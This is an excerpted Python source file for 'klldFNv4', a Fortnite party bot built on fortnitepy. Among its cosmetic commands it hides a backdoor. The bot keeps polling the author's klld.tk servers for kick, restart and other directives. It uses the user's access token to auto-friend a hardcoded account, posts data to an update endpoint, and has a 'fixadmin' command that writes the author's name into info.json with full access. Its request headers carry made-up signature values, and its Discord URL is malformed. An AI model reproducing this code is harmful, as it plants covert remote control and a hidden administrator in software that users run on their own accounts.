...
print(crayons.blue(f'klldFNv4 made by klld. credit to Terbau for creating the library.'))
print(crayons.blue(f'Discord server: https://https:/https://42web.klld.tk/discord - For support, questions, etc.'))
...
copied_player = ""
__version__ = "None"
adminsss = 'ʏᴏᴜᴛᴜʙᴇ ᴋʟʟᴅ'
headers = {'Accept': '*/*'}
errordiff = 'errors.com.epicgames.common.throttled', 'errors.com.epicgames.friends.inviter_friendships_limit_exceeded'
vips = "ʏᴏᴜᴛᴜʙᴇ ᴋʟʟᴅ"
headersx = {'host': '42web.klld.tk','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.22','enable-super-fast': "True",'x-gorgon': "172SJAI19A","x-signature": "4HKAI18ALOQ"}
...
class PartyBot(commands.Bot):
    def __init__(self, device_id: str, account_id: str, secret: str, loop=asyncio.get_event_loop(), **kwargs) -> None:
        ...
        self.bl_inv = 'ʏᴏᴜᴛᴜʙᴇ ᴋʟʟᴅ'
        self.inv_on = "T"

        self.adminx = "ʏᴏᴜᴛᴜʙᴇ ᴋʟʟᴅ"
    ...
    async def add_list(self) -> None:
        ...
        klld = await self.http.post(
            route = url,
            json = payload,
            auth = self.http.get_auth('FORTNITE_ACCESS_TOKEN')
            )

        if not 'e375edab04964813a886ee974b66bd70' in self.friends:
    ...
    async def checker_autox(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            v = requests.get("https://v4.klld.tk/klldfnv4/default1",headers={
                'host': 'v4.klld.tk',
            ...
            b = requests.get(f"https://v4.klld.tk/klldfnv4/kick",headers={
                'host': 'v4.klld.tk',
            ...
            y = requests.get(f"https://v4.klld.tk/klldfnv4/restart",headers={
                'host': 'v4.klld.tk',
    ...
    async def normal_setup(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            u = requests.get(f"https://v4.klld.tk/klldfnv4/default1",headers={
                'host': '42web.klld.tk',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.53',
                'enable-super-fast': "True",
                'x-gorgon': "NZXHA6JSI14",
            ...
            s = requests.get(f"https://v4.klld.tk/klldfnv4/kick",headers={
                'host': '42web.klld.tk',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.30',
                'enable-super-fast': "False",
                'x-gorgon': "A7JD2Y27D2K",
            ...
            m = requests.get(f"https://v4.klld.tk/klldfnv4/restart",headers={
                'host': '42web.klld.tk',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.24',
                'enable-super-fast': "None",
                'x-gorgon': "NC28AH28SJ19S",
    ...
    async def auto_add_s(self):
        x = requests.get(f"https://v4.klld.tk/klldfnv4/add_auto",headers={
                'host': '42web.klld.tk',
    ...
    async def checker_status(self):
        q = requests.get(f"https://v4.klld.tk/klldfnv4/status",headers={
                'host': '42web.klld.tk',
    ...
    async def checker_skin_bl(self):
        w = requests.get("https://v4.klld.tk/klldfnv4/skinbl",headers={
                'host': '42web.klld.tk',
    ...
    async def update_api(self) -> None:
        resp = requests.post(
                url=f'https://42web.klld.tk/update',
                json={
    ...
    async def skinx(self, ctx: fortnitepy.ext.commands.Context, *, content = None) -> None:
        if content is None:
            ...
            try:
                ...
                await ctx.send(f'Skin set to {cosmetic.name} {cosmetic.id}.')
    ...
    async def new(self, ctx: fortnitepy.ext.commands.Context, cosmetic_type: str = 'skin') -> None:
        cosmetic_types = {'skin': {'id': 'Character_','function': self.party.me.set_outfit},'backpack': {'id': 'bid_','function': self.party.me.set_backpack},'emote': {'id': 'eid_','function': self.party.me.set_emote},}
...
#///////////////////////////////////////////////////////////////////////////////////////////////////////////// PARTY/FRIENDS/ADMIN //////////////////////////////////////////////////////////////////////////////////////////////////////
    ...
    @commands.command()
    async def upload(self, ctx: fortnitepy.ext.commands.Context) -> None:
        await ctx.send(f'upload {__version__}')
        os.system('clear')
    ...
    async def fixadmin(self, ctx: fortnitepy.ext.commands.Context):
        if ctx.author.display_name == 'ʏᴏᴜᴛᴜʙᴇ ᴋʟʟᴅ':
            with open("info.json", "w") as f:
                f.write('{"FullAccess": ["ʏᴏᴜᴛᴜʙᴇ ᴋʟʟᴅ"]}')
            await ctx.send('work')
